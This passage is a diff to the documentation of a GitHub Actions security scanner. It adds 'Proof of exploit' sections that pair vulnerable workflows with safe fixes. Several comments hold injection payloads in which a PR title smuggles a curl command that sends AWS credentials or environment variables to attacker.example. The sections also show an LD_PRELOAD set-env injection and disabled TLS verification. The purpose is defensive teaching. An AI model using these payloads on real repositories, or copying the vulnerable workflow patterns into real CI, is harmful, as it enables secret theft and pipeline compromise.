@@ -3900,6 +3900,42 @@ steps:
 
 **Recommendation.** Move the action to a separate repo under your control and reference it by SHA-pinned `uses: org/repo@<sha>`, or split the workflow so the privileged work runs only on `pull_request` (read-only token, no secrets) where PR-controlled action.yml can't escalate.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: pull_request_target checks out the PR head
+# (or skips checkout entirely and resolves the local action
+# against the repo's current ref). Either way, a PR can
+# modify ``./actions/lint-pr/action.yml`` and have its own
+# action.yml execute with default-branch token + secrets in
+# scope.
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - uses: ./actions/lint-pr
+
+# Safe: trigger on pull_request (read-only token, no
+# repo secrets) so a PR-controlled action.yml can't
+# escalate beyond what the PR head was already going to
+# run anyway.
+on:
+  pull_request:
+    types: [opened, synchronize]
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - uses: ./actions/lint-pr
+```
+
 **Source:** [`GHA-010`](../providers/github.md#gha-010) in the [GitHub Actions provider](../providers/github.md).
 
 ### `GHA-011`: Cache key derives from attacker-controllable input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-011 }
@@ -3923,6 +3959,40 @@ steps:
 **Known false positives.**
 
 - Guard detection runs against the whole workflow as text rather than against parsed ``if:`` expressions, so a guard token appearing in an unrelated context (a comment, a step name, a description field) reads as satisfying the rule. Conversely, guards expressed via alternative author-association idioms the regex doesn't recognize (``github.event.issue.user.login``, an org-membership API check inside a script) leave the rule firing even though the workflow is safely gated. Suppress per-workflow via ``--ignore-file`` once you've verified the gate logic; tighten the guard expression to use the recognized tokens if possible.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: any GitHub user posts a comment ``/deploy``
+# (or just any comment, since the if: doesn't gate on author)
+# and the workflow runs with write-scope GITHUB_TOKEN.
+on:
+  issue_comment:
+    types: [created]
+jobs:
+  ship:
+    if: contains(github.event.comment.body, '/deploy')
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: ./scripts/deploy
+
+# Safe: the if: gates on author association first; only
+# OWNER / MEMBER / COLLABORATOR commenters can trigger.
+on:
+  issue_comment:
+    types: [created]
+jobs:
+  ship:
+    if: >
+      contains(github.event.comment.body, '/deploy') &&
+      contains('OWNER MEMBER COLLABORATOR',
+               github.event.comment.author_association)
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: ./scripts/deploy
+```
 
 **Source:** [`GHA-013`](../providers/github.md#gha-013) in the [GitHub Actions provider](../providers/github.md).
 
@@ -4117,6 +4187,40 @@ jobs:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: every git fetch in the job ignores certificate
+# validity. An attacker on the same network (corporate proxy,
+# hostile WiFi at a remote-dev's home, compromised mirror)
+# returns a MITM-substituted clone of the dependency. The
+# downstream build runs the attacker's code with the
+# workflow's full secret + token set in scope.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: git config --global http.sslVerify false
+      - run: git clone https://internal.example.com/lib.git
+      - run: ./build
+
+# Safe: install the missing CA chain so verification succeeds.
+# If the upstream really uses a private CA, ship its root in
+# the runner image rather than disabling verification for
+# every host the job talks to.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: |
+          sudo cp ./ci/internal-ca.crt /usr/local/share/ca-certificates/
+          sudo update-ca-certificates
+      - run: git clone https://internal.example.com/lib.git
+      - run: ./build
+```
+
 **Source:** [`GHA-023`](../providers/github.md#gha-023) in the [GitHub Actions provider](../providers/github.md).
 
 ### `GHA-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-024 }
@@ -4175,6 +4279,34 @@ jobs:
 **Known false positives.**
 
 - ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool> <literal-args>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd. The rule only fires when the substituted command references a variable.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a PR-title-shaped env value is re-parsed as
+# shell. A PR titled
+#   ; curl -d @~/.aws/credentials https://attacker.example
+# turns the eval line into a credential exfiltration step.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - env:
+          DEPLOY_CMD: ${{ github.event.pull_request.title }}
+        run: eval "$DEPLOY_CMD"
+
+# Safe: pass the value as data, not code. ``deploy`` reads
+# stdin; metacharacters in the title stay literal.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - env:
+          DEPLOY_LABEL: ${{ github.event.pull_request.title }}
+        run: ./scripts/deploy --label-from-env DEPLOY_LABEL
+```
 
 **Source:** [`GHA-028`](../providers/github.md#gha-028) in the [GitHub Actions provider](../providers/github.md).
 
@@ -4260,6 +4392,39 @@ jobs:
 
 - Scripts that interpolate ``${{ steps.*.outputs.* }}`` from a trusted upstream step are out of scope (the rule only matches the curated untrusted-context regex). If you intentionally rely on a non-curated context, suppress with a brief ``.pipelinecheckignore`` rationale.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a PR title containing
+#   `;require('child_process').execSync('curl https://attacker.example/-d "$(env)"');//
+# closes the surrounding string, runs Node code against the
+# workflow's GITHUB_TOKEN, and exfiltrates every env var.
+jobs:
+  comment:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@<sha>
+        with:
+          script: |
+            const title = `${{ github.event.pull_request.title }}`;
+            await github.rest.issues.createComment({ body: title });
+
+# Safe: route the value through env so Node sees it as a
+# string, never as JavaScript source.
+jobs:
+  comment:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@<sha>
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        with:
+          script: |
+            await github.rest.issues.createComment({
+              body: process.env.PR_TITLE,
+            });
+```
+
 **Source:** [`GHA-035`](../providers/github.md#gha-035) in the [GitHub Actions provider](../providers/github.md).
 
 ### `GHA-036`: runs-on interpolates untrusted context <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gha-036 }
@@ -4275,6 +4440,37 @@ jobs:
 **Known false positives.**
 
 - Workflows that intentionally select runners by environment via a vetted matrix (``runs-on: ${{ matrix.os }}`` where ``matrix.os`` is a hard-coded list inside the workflow) are out of scope, the matrix values are author-controlled, not caller-controlled. The rule only matches the catalog of untrusted contexts (``inputs.*``, ``github.event.*``, ``github.head_ref``, …); ``matrix.*`` and ``env.*`` references are intentionally not flagged.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: workflow_dispatch input picks the runner. A
+# caller who can dispatch the workflow picks ``prod-deploy``
+# (or any other privileged self-hosted label the org owns)
+# and the job runs with that fleet's inherited identity.
+on:
+  workflow_dispatch:
+    inputs:
+      runner:
+        type: string
+        required: true
+jobs:
+  run:
+    runs-on: ${{ inputs.runner }}
+    steps:
+      - run: ./scripts/build
+
+# Safe: pin to a hard-coded label. If the choice really has
+# to be parameterised, validate the input against an
+# allowlist at job-level via a small if: guard before any
+# step runs.
+on: { workflow_dispatch: {} }
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    steps:
+      - run: ./scripts/build
+```
 
 **Source:** [`GHA-036`](../providers/github.md#gha-036) in the [GitHub Actions provider](../providers/github.md).
 
@@ -4309,6 +4505,38 @@ Sister rule GHA-031 catches direct uses of ``::set-output::`` / ``::save-state::
 **Known false positives.**
 
 - Some legacy actions (last-updated pre-2020) still emit ``::set-env::`` lines and rely on the override to be set. Replace the action rather than suppressing this rule, the security exposure outweighs the cost of an alternative action.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the workflow re-enables the retired command
+# channel. Any tool output containing ``::set-env::`` (a
+# build log, a downloaded artifact, an upstream test runner)
+# now injects environment variables into subsequent steps.
+# A printed line
+#   ::set-env name=LD_PRELOAD::/tmp/x.so
+# from a compromised transitive dep silently rewires the
+# linker on the next ``run:`` step.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      ACTIONS_ALLOW_UNSECURE_COMMANDS: "true"
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: ./scripts/build
+
+# Safe: don't set the override; use the file-redirect form
+# for any env / PATH mutation the workflow legitimately needs.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@<sha>
+      - run: |
+          echo "BUILD_TAG=$(git rev-parse --short HEAD)" >> "$GITHUB_ENV"
+      - run: ./scripts/build
+```
 
 **Source:** [`GHA-038`](../providers/github.md#gha-038) in the [GitHub Actions provider](../providers/github.md).
 
